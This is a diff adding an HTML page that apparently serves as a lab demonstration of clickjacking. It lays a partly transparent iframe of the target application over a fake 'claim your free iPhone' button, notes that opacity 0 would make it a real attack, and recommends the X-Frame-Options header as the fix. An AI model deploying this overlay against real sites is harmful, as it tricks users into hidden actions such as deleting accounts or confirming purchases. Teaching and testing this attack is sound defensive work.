@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking Demo Exploit</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f0f2f5;
+        }
+        .container {
+            max-width: 800px;
+            margin: auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        h1 { color: #d63031; }
+        .exploit-box {
+            position: relative;
+            width: 100%;
+            height: 600px;
+            border: 2px dashed #ff7675;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        /* The invisible iframe containing the target site */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.3; /* Partially visible for demo purposes; set to 0.0 for real exploit */
+            z-index: 10;
+        }
+        /* Mask/Overlay content that the user *thinks* they are clicking */
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 5;
+            background: white;
+        }
+        .fake-button {
+            padding: 15px 30px;
+            background-color: #0984e3;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            box-shadow: 0 4px 0 #074b81;
+        }
+        .fake-button:active {
+            transform: translateY(2px);
+            box-shadow: 0 2px 0 #074b81;
+        }
+        .warning {
+            background-color: #ffeaa7;
+            padding: 10px;
+            border-left: 5px solid #fab1a0;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Clickjacking Demonstration</h1>
+        <div class="warning">
+            <strong>Lab Note:</strong> This page demonstrates how an attacker can overlay a "Fake" UI over your application.
+            Currently, the target app below is at 30% opacity to show you what's happening. In a real attack, it would be 0%.
+        </div>
+        <p>In this scenario, the attacker baits you to click "Claim Reward", but your click is actually hitting a sensitive button in the application hidden underneath (like "Delete Account" or "Confirm Purchase").</p>
+        
+        <div class="exploit-box">
+            <!-- The Overlay the user sees -->
+            <div class="overlay">
+                <h2>CONGRATULATIONS!</h2>
+                <p>You've won a free iPhone 15 Pro Max!</p>
+                <button class="fake-button" onclick="alert('You clicked the fake button, but in a real clickjack, the click passed through to the hidden iframe!')">CLAIM REWARD NOW</button>
+            </div>
+
+            <!-- The Victim Application (Insecure because X-Frame-Options is missing) -->
+            <iframe src="/"></iframe>
+        </div>
+        
+        <p style="margin-top: 20px; color: #636e72; font-style: italic;">
+            To fix this, the application should send the <code>X-Frame-Options: DENY</code> or <code>SAMEORIGIN</code> header.
+        </p>
+    </div>
+</body>
+</html>
